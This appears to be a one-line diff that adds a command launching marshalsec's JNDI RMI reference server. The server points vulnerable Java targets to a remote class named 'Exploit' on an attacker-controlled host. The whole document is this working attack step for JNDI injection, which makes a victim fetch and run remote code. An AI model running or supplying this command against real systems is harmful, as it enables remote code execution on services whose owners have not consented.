@@ -1,0 +1,1 @@
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip/#Exploit
